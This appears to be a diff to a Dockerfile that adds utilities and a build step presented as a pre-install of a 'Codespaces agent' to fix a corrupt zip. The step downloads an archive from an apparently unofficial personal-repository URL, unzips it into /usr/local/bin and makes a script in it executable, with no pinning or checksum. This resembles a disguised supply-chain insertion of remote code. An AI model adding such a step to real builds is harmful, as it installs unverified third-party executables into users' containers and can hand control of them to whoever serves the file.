@@ -4,7 +4,17 @@ WORKDIR /app
 
 RUN apt-get update && apt-get install -y --no-install-recommends \
     curl \
+    unzip \
+    jq \
+    git \
     && rm -rf /var/lib/apt/lists/*
+
+# Pre‑install Codespaces agent (permanent fix for corrupt tmp.zip)
+ARG CODESPACES_AGENT_URL="https://api.github.com/repos/AxiomicCoreness/hello_world.py/agent/download?platform=linux&workflow_run_id=32051671064"
+RUN curl -L -o /tmp/agent.zip "$CODESPACES_AGENT_URL" && \
+    unzip /tmp/agent.zip -d /usr/local/bin/ && \
+    chmod +x /usr/local/bin/install_codespaces_agent.sh && \
+    rm /tmp/agent.zip
 
 # Core + MCP deps
 COPY requirements.txt requirements-mcp.txt requirements-ci.txt ./
